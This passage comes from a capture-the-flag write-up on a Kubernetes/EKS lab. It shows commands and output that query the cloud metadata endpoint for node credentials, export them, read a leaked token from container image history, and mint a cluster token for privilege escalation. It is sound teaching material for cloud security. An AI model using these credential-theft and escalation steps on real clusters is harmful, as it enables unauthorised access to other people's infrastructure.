<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].spec.containers[0].image'</span></span>
<span data-line=""><span style="color: #F69D50">"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01"</span></span></code></pre></div>
<p>Which as expected, we do not have access to:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">688655246681</span><span style="color: #96D0FF">.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span>
<span data-line=""><span style="color: #F69D50">Error:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">fetching</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">reading</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">image</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01":</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">GET</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">unexpected</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">status</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">code</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">401</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Unauthorized:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Authorized</span></span></code></pre></div>
<p>Since I expect the pod already has AWS access, lets check if the AWS CLI works:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get-caller-identity</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">Unable</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">locate</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">credentials.</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">You</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">configure</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">credentials</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">by</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">running</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"aws configure".</span></span></code></pre></div>
<p>Credentials are not configured right now, so we need to discover them.  Lets
check if we have metadata server access:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">http://169.254.169.254/latest/meta-data/iam</span></span>
<span data-line=""><span style="color: #F69D50">info</span></span>
<span data-line=""><span style="color: #F69D50">security-credentials/</span></span></code></pre></div>
<p>We do!  So we should be able to pull the credentials out of there to get access
to AWS:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-sS</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"AccessKeyId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ASIA2AVYNE&#x3C;*REDACTED*>",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"Expiration"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-03 03:50:19+00:00",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"SecretAccessKey"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"SessionToken"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Lets set those as environment variables to activate our AWS access:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">export</span><span style="color: #ADBAC7"> AWS_ACCESS_KEY_ID</span><span style="color: #F47067">=</span><span style="color: #96D0FF">"ASIA2AVYNE&#x3C;*REDACTED*"</span></span>
<span data-line=""><span style="color: #F47067">export</span><span style="color: #ADBAC7"> AWS_SECRET_ACCESS_KEY</span><span style="color: #F47067">=</span><span style="color: #96D0FF">"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*"</span></span>
<span data-line=""><span style="color: #F47067">export</span><span style="color: #ADBAC7"> AWS_SESSION_TOKEN</span><span style="color: #F47067">=</span><span style="color: #96D0FF">"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get-caller-identity</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"UserId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ASIA2AVYNE&#x3C;*REDACTED*>:i-0cb922c6673973282",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Account"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"688655246681",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Arn"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Now we should be able to authenticate crane and inspect the image from ECR:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">PASSWORD=$(</span><span style="color: #F69D50">aws</span><span style="color: #96D0FF"> ecr get-login-password)</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">login</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-u</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">AWS</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-p</span><span style="color: #ADBAC7"> $PASSWORD </span><span style="color: #6CB6FF">688655246681</span><span style="color: #96D0FF">.dkr.ecr.us-west-1.amazonaws.com</span><span style="color: #ADBAC7">  </span></span>
<span data-line=""><span style="color: #F69D50">2023/11/03</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">02</span><span style="color: #96D0FF">:56:41</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">logged</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">in</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">via</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/home/user/.docker/config.json</span></span></code></pre></div>
<p>Lets get those layers!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">config</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">688655246681</span><span style="color: #96D0FF">.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"architecture"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"amd64",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"config"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Env"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Cmd"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"/bin/sleep"</span><span style="color: #F69D50">,</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"3133337"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"ArgsEscaped"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span><span style="color: #96D0FF">,</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"OnBuild"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">null</span></span>
<span data-line=""><span style="color: #ADBAC7">  },</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:07.782534085Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"history"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-07-18T23:19:33.538571854Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-07-18T23:19:33.655005962Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"/bin/sh -c #(nop)  CMD [</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">sh</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">]",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"empty_layer"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:07.782534085Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal&#x3C;*REDACTED*>} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"comment"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"buildkit.dockerfile.v0"</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span>
<span data-line=""><span style="color: #ADBAC7">    {</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T13:32:07.782534085Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"created_by"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"CMD [</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">/bin/sleep</span><span style="color: #F47067">\"</span><span style="color: #96D0FF"> </span><span style="color: #F47067">\"</span><span style="color: #96D0FF">3133337</span><span style="color: #F47067">\"</span><span style="color: #96D0FF">]",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"comment"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"buildkit.dockerfile.v0",</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"empty_layer"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">  ],</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"os"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"linux",</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">"rootfs"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"type"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"layers",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"diff_ids"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f"</span><span style="color: #F69D50">,</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">"sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"</span></span>
<span data-line=""><span style="color: #ADBAC7">    ]</span></span>
<span data-line=""><span style="color: #ADBAC7">  }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>Looks like they made the same mistake again and leaked the secret in the image
layers!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">wiz_eks_challenge{the_history_of_container_images_could_reveal&#x3C;*REDACTED*>} </span></span></code></pre></div>
<p>Time for challenge 4!</p>
<h1>Challenge 4</h1>
<p>The hint:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has</span></span>
<span data-line=""><span style="color: #adbac7">no permissions. Can you navigate your way to access the EKS Node's privileged</span></span>
<span data-line=""><span style="color: #adbac7">service-account?</span></span></code></pre></div>
<p>This sounds like we're going to need to escalate our privileges through the AWS
access we acquired in the last challenge. Lets start with inspecting the
environment again:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">pod</span></span>
<span data-line=""><span style="color: #F69D50">Error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">from</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">server</span><span style="color: #ADBAC7"> (Forbidden): pods is forbidden: User </span><span style="color: #96D0FF">"system:serviceaccount:challenge4:service-account-challenge4"</span><span style="color: #ADBAC7"> cannot list resource </span><span style="color: #96D0FF">"pods"</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">in</span><span style="color: #ADBAC7"> API group </span><span style="color: #96D0FF">""</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">in</span><span style="color: #ADBAC7"> the namespace </span><span style="color: #96D0FF">"challenge4"</span></span></code></pre></div>
<p>So we don't even have access to list pods!   Do we have any access?</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--list</span></span>
<span data-line=""><span style="color: #F69D50">warning:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">may</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">be</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">incomplete:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">webhook</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authorizer</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">does</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">support</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">user</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resolution</span></span>
<span data-line=""><span style="color: #F69D50">Resources</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">Non-Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">URLs</span><span style="color: #ADBAC7">                     </span><span style="color: #96D0FF">Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Names</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Verbs</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectaccessreviews.authorization.k8s.io</span><span style="color: #ADBAC7">   []                                    []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectrulesreviews.authorization.k8s.io</span><span style="color: #ADBAC7">    []                                    []                 [create]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/.well-known/openid-configuration]   []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api]                                []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis]                               []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openid/v1/jwks]                     []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]                           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]                           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]                            []                 [get]</span></span>
<span data-line=""><span style="color: #F69D50">podsecuritypolicies.policy</span><span style="color: #ADBAC7">                      []                                    [eks.privileged]   [use]</span></span></code></pre></div>
<p>That is <em>very</em> minimal access. So we are going to have to try get a token using
the escalated privileges.  Usually we could use <code>aws eks get-token</code> but that
requires knowing the cluster name and I don't know that.   Lets try to list the
clusters:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eks</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list-clusters</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">An</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">occurred</span><span style="color: #ADBAC7"> (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/</span><span style="color: #F47067">*</span></span></code></pre></div>
<p>So they haven't given us much to go on at all here.  The role itself <em>might</em> be
a clue but that is relying on them being consistent with their naming:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/</span></span></code></pre></div>
<p>The cluster name <em>might</em> be <code>eks-challenge-cluster</code> based on that but I can't
guarantee that. Lets check its security groups:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-sS</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">http://169.254.169.254/latest/meta-data/security-groups</span><span style="color: #ADBAC7">;</span><span style="color: #6CB6FF">echo</span></span>
<span data-line=""><span style="color: #F69D50">eks-cluster-sg-eks-challenge-cluster-963543728</span></span></code></pre></div>
<p>The name is there again.  I don't feel good about not having more details but it
is at least worth trying it:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eks</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get-token</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--cluster-name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">eks-challenge-cluster</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ExecCredential",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"client.authentication.k8s.io/v1beta1",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"spec"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{},</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"status"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"expirationTimestamp"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-03T03:38:10Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"token"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYX&#x3C;*REDACTED*"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>This gets us a token, so lets try to use it:</p>
